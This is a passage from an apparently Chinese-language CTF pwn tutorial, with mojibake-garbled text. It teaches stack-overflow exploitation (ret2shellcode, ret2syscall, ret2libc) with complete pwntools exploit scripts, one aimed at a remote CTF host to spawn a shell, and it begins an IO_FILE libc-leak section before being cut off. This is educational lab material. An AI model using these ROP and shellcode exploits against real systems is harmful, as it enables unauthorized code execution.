ï¼ŒshellcodeæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚<strong>ä¸€èˆ¬æ¥è¯´ï¼Œshellcodeè¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚</strong></p><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æ‰§è¡Œshellcodeï¼Œéœ€è¦shellcodeæ‰€åœ¨åŒºåŸŸæœ‰å¯æ‰§è¡Œæƒé™ã€‚ï¼ˆæ²¡æœ‰NXä¿æŠ¤ï¼Œæˆ–è€…ç”¨mprotectï¼ˆï¼‰ä¸ºä¸€æ®µåŒºåŸŸèµ‹äºˆäº†å¯æ‰§è¡Œæƒé™ï¼Œæˆ–è€…bssæ®µå¯æ‰§è¡Œï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯æŠŠ0x401000å¼€å§‹çš„é•¿åº¦ä¸º0x1000çš„åŒºåŸŸæ ‡è®°ä¸ºå¯æ‰§è¡Œï¼Œæˆ‘ä»¬ç›´æ¥æŠŠshellcodeä¼ è¿›å»ï¼Œå³å¯getshellï¼Œç”±äºcopyå‘ç”Ÿåœ¨0x401000ï¼Œä½†æ˜¯ä»0x401020å¼€å§‹æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå¡«å……0x20å„å­—èŠ‚å†å¡«å……shellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>ç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥å®ç°æƒ³è¦å®ç°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¯ä»¥ç”¨ <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> ç³»ç»Ÿè°ƒç”¨æ¥è·å–shellï¼Œè¿™éœ€è¦æ»¡è¶³ï¼š</p><ul><li><p>ç³»ç»Ÿè°ƒç”¨å·ï¼Œeax ä¸º 0xb(x86) &#x2F; rax ä¸º 0x3b(x64)</p></li><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œebx &#x2F; rdi ä¸º &#x2F;bin&#x2F;sh åœ°å€</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œecx ä¸º 0 &#x2F; rsi ä¸º 0</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œedx ä¸º 0 &#x2F; rdx ä¸º 0</p></li><li><p>æœ€åè¿”å› int 0x80(x86) &#x2F; syscall ret(x64)</p><p>çœ‹ä¸€é“ä¾‹é¢˜ï¼š<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p></li></ul><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png" alt="main"></p><p>ç¨‹åºé‡Œé¢æ²¡æœ‰ç°æˆçš„&#x2F;bin&#x2F;shï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€æ¬¡è¯»å­—ç¬¦ä¸²ï¼Œä¸€æ¬¡æ‹¿sh</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># è°ƒç”¨sys_readï¼Œç”¨æ¥è¯»å–åé¢è¾“å…¥çš„/bin/shåˆ°bssæ®µ</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># è°ƒç”¨execveæ¥getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>å½“ä¸çŸ¥é“é¢˜ç›®libcç‰ˆæœ¬<del>ï¼ˆç°åœ¨çš„ctfåº”è¯¥ä¸ä¼šè¿˜æœ‰æ¯”èµ›ä¸ç»™libcå§ï¼Œä¸ä¼šå§ä¸ä¼šå§~ï¼‰</del>ï¼Œå¹¶ä¸”å­˜åœ¨è¶³å¤Ÿçš„æº¢å‡ºç©ºé—´ï¼Œæ˜¯å¯ä»¥é€šè¿‡æ³„éœ²å‡½æ•°åœ°å€ï¼ˆå®é™…ä¸Šåªéœ€è¦ä½ä¸‰ä½æ•°å­—ï¼‰æ¥æŸ¥æ‰¾libcç‰ˆæœ¬ï¼Œ<strong>å½“ç„¶çŸ¥é“libcç‰ˆæœ¬å¯èƒ½ä¹Ÿä¼šéœ€è¦leakåŸºåœ°å€æ¥è®¡ç®—systemç­‰å‡½æ•°çš„åœ°å€</strong></p><p>è¿™é‡Œå»ºè®®ä½¿ç”¨pyçš„LibcSearcheråº“ï¼Œè¿™ä¸ªåº“æ˜¯åœ¨çº¿æŸ¥æ‰¾çš„ï¼ˆä¹Ÿå°±æ˜¯è¦è”ç½‘ï¼‰ï¼Œ<del><em>ä¹Ÿå¯ä»¥æœ¬åœ°ä¸€ä¸ªä¸€ä¸ªè¯•</em></del></p><p>ret2libcçš„æ€è·¯æ˜¯å¯»æ‰¾ç¨‹åºä¸­çš„gadgetæ„é€ ROPï¼Œæ¥è°ƒç”¨ç¨‹åºä¸­çš„è¾“å‡ºå‡½æ•°å¦‚ï¼šputsï¼Œwriteï¼Œæ‰“å°ä¸€äº›å‡½æ•°çš„åœ°å€ï¼Œä»è€Œè¾¾åˆ°æ³„éœ²åŸºåœ°å€çš„ç›®çš„</p><p><strong>ä¾‹é¢˜ï¼š</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p><p>åœ¨vulnå‡½æ•°é‡Œé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œæº¢å‡ºé•¿åº¦è¶³å¤Ÿæ„é€ ROP</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png" alt="vuln"></p><p>è¦†ç›–çš„é•¿åº¦ä¸º0x40+0x8ï¼ˆrbpï¼‰&#x3D;0x48</p><p>ç„¶åç”±äºx64å‰å…­ä¸ªå‚æ•°ç”¨å¯„å­˜å™¨ä¼ ï¼Œå¤šçš„æ‰æ˜¯å’Œx86ä¸€æ ·æ ˆä¼ å‚ï¼Œè¿™å‰å…­ä¸ªå‚æ•°ä¾æ¬¡ç”¨rdiï¼Œrsiï¼Œrcxï¼Œrdxï¼Œr8ï¼Œr9å¯„å­˜å™¨</p><p>è¿™é‡Œæˆ‘ä»¬ç›®çš„æ˜¯é€šè¿‡putså‡½æ•°æ¥è¾“å‡ºputsçš„gotè¡¨ä¸­çš„åœ°å€æ¥æ³„éœ²putsçš„çœŸå®åœ°å€ã€‚</p><p>æ‰€ä»¥è¦æŠŠputs_gotä½œä¸ºå‚æ•°ä¼ è¿›putså‡½æ•°é‡Œï¼Œä¹Ÿå°±æ˜¯è¦ç”¨åˆ°rdiå¯„å­˜å™¨ã€‚<strong>ï¼ˆæ‰¾gadgetå¯ä»¥ç”¨ROPgadgetï¼‰</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png" alt="findrdi"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .gotæŒ‡å‘å‡½æ•°åœ¨libcçš„çœŸå®åœ°å€</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># ä¹Ÿå¯ä»¥elf.sym[&#x27;puts&#x27;]ï¼Œå› ä¸º.pltå­˜çš„å°±æ˜¯å‡½æ•°çš„ç¬¦å·ä¿¡æ¯</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ä¹Ÿå¯ä»¥å¡«vulnå‡½æ•°åœ°å€ï¼Œåªè¦ä¿è¯å†ç”¨ä¸€æ¬¡readå°±è¡Œ</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ¥æ”¶æ‰“å°çš„åœ°å€ï¼Œåœ¨æŸ¥æ‰¾libcç‰ˆæœ¬ï¼Œç„¶åè®¡ç®—systemï¼Œå­—ç¬¦ä¸²&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå°±å¯ä»¥æ„é€ ç¬¬äºŒä¸ªpayload</p><p><strong>è¦æ³¨æ„ï¼šubuntu18ä»¥ä¸Šç‰ˆæœ¬è°ƒç”¨ç³»ç»Ÿå‡½æ•°è¦æ ˆå¯¹é½ï¼Œä¸€èˆ¬åœ¨ä¼ å‚å‰åŠ ä¸ªretçš„gadgetå°±è¡Œ</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png" alt="findret"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># è¿™ä¹ˆå†™æ˜¯å› ä¸ºä¸€èˆ¬ä»¥\x7fç»“å°¾çš„6ä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¦‚æœæ˜¯ç»™äº†ä½ libcæ–‡ä»¶ï¼Œæœ¬åœ°åŠ è½½æ—¶ç”¨ELF()å°±è¡Œï¼Œç”¨æ³•è‡ªç„¶è·Ÿä¸Šé¢LibcSearcherçš„ä¸ä¸€æ ·</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">py3ä¸­search()çš„å‚æ•°å¿…é¡»æ˜¯bytesï¼Œç„¶ånextæ–¹æ³•å¤šäº†ä¸‹åˆ’çº¿</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure><p><strong>å®Œæ•´exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><strong>æ ˆæº¢å‡ºå°ç»“ï¼šæ ˆæº¢å‡ºæ˜¯ä¸ºäº†è¦†å†™æŸäº›æ•°æ®æ¥è¾¾åˆ°æ”»å‡»è€…ç›®çš„çš„ä¸€ç§æ‰‹æ®µï¼Œä¸èƒ½åªæ˜¯ç®€å•çš„èƒŒäº†ä»€ä¹ˆret2textï¼Œret2libcç­‰é¢˜å‹æ¨¡æ¿ï¼Œæ›´é‡è¦çš„æ˜¯ç†è§£è¿™ç§æ‰‹æ®µã€‚è€Œä¸”æº¢å‡ºä¸åªæ˜¯scanfï¼Œreadï¼Œgetsè¿™äº›ï¼Œstrcpyä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºæœ¬è´¨ä¸Šéƒ½æ˜¯ç”±ä¸€ä¸ªç¼“å†²åŒºå¤åˆ¶åˆ°å¦ä¸€ä¸ªç¼“å†²åŒºã€‚å¦å¤–è¦†å†™çš„æ•°æ®ä¹Ÿä¸å°½å°±æ˜¯è¿”å›åœ°å€äº†ï¼Œåƒåˆšæ‰åœ¨è¦†ç›–åˆ°retä¹‹å‰é¡ºä¾¿è¦†ç›–äº†ä¸€ä¸ªintå˜é‡ï¼Œåœ¨è¿™é‡Œæ²¡çœ‹åˆ°ä»€ä¹ˆä½œç”¨ï¼Œä½†æ˜¯å‡å¦‚æ˜¯ä¸€ä¸ªå…³é”®æ•°æ®ï¼ˆæ¯”å¦‚ä¸€ä¸ªéšæœºæ•°ï¼‰ï¼Œå°±å¯ä»¥èµ·åˆ°å¾ˆå¤§ç”¨å¤„äº†ã€‚</strong></p><h2 id="EZzzzçš„heap"><a href="#EZzzzçš„heap" class="headerlink" title="EZzzzçš„heap"></a>EZzzzçš„heap</h2><p><em>å¾…è¡¥å……â€¦â€¦</em></p><h3 id="linux-heapçš„åˆ†é…"><a href="#linux-heapçš„åˆ†é…" class="headerlink" title="linux heapçš„åˆ†é…"></a>linux heapçš„åˆ†é…</h3><h3 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h3><h1 id="ä¸€äº›æ‚é¡¹"><a href="#ä¸€äº›æ‚é¡¹" class="headerlink" title="ä¸€äº›æ‚é¡¹"></a>ä¸€äº›æ‚é¡¹</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h2><h3 id="é€šè¿‡stdoutæ³„éœ²libc"><a href="#é€šè¿‡stdoutæ³„éœ²libc" class="headerlink" title="é€šè¿‡stdoutæ³„éœ²libc"></a>é€šè¿‡stdoutæ³„éœ²libc</h3><p>æœ‰æ—¶å€™åƒæ³„éœ²libcåŸºåœ°å€ä¼šå‘ç°æ²¡æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„putsä¹‹ç±»çš„è¾“å‡ºå‡½æ•°ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ‰“<code>_IO_2_1_stdout_</code>æ¥è¾¾åˆ°æ³„éœ²libcåœ°å€çš„ç›®çš„ã€‚<strong>ï¼ˆä»¥ä¸‹ä»¥libc-2.31ä¸ºä¾‹ï¼‰</strong></p><p><em><strong>æˆ‘çœ‹æºç çš„ç½‘ç«™ï¼š<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/">https://elixir.bootlin.com/glibc/glibc-2.31/source/</a></strong></em></p><p>å¯ä»¥ç”¨pwndbgå…ˆå¤§è‡´çœ‹ä¸€ä¸‹ç»“æ„ï¼šï¼‰ï¼Œæœ¬èŠ‚å®é™…åªä¼šæåˆ°å‰ä¸€å°éƒ¨åˆ†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_2_1_stdout_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,// 0xFBAD2887</span><br><span class="line">    _IO_read_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_end = 0x7ffff7f9b7e4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7f9aa80 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;\n&quot;,</span><br><span class="line">    _lock = 0x7ffff7f9ca10 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7f9a980 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7f975e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœç´¢stdoutï¼Œåœ¨stdio.cæŸ¥çœ‹å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°stdoutå®é™…æ˜¯<code>_IO_2_1_stdout_</code>ï¼Œç±»å‹ä¸ºio_file_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 